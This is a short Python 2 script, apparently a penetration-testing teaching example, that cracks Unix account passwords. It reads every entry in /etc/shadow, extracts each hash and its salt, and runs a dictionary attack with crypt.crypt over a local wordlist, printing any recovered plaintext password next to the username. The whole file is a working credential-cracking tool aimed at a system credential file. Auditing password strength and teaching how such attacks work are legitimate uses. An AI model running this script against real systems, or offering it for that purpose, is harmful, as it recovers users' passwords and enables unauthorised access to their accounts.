import crypt
def testPass(cryptPass):
    if cryptPass == '*' or cryptPass == '!':
        print "[-] Password Not Found.\n"
        return
    else:
        salt = '$'.join(cryptPass.split("$")[0:3])
        dictFile = open('dictionary', 'r')
        for word in dictFile:
            word = word.strip('\n')
            cryptWord = crypt.crypt(word, salt)
            if (cryptWord == cryptPass):
                print "[+] Found Password: "+word+"\n" 
                return
        print "[-] Password Not Found.\n"
        return
    
def main():
    passFile = open('/etc/shadow')
    for line in passFile:
        if ':' in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print "[*] Cracking Password For: " + user
            testPass(cryptPass)

if __name__ == "__main__":
    main()
